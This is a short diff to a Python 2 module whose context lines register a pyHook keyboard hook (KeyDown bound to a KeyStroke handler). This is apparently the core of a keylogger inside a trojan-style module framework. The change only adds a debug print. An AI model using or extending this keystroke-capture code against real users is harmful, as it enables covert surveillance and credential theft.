@@ -66,6 +66,7 @@ def KeyStroke(event):
     # pass execution to next hook registered 
     return True
 def run(**args):
+    print "[*] In test module."
     # create and register a hook manager 
     kl         = pyHook.HookManager()
     kl.KeyDown = KeyStroke
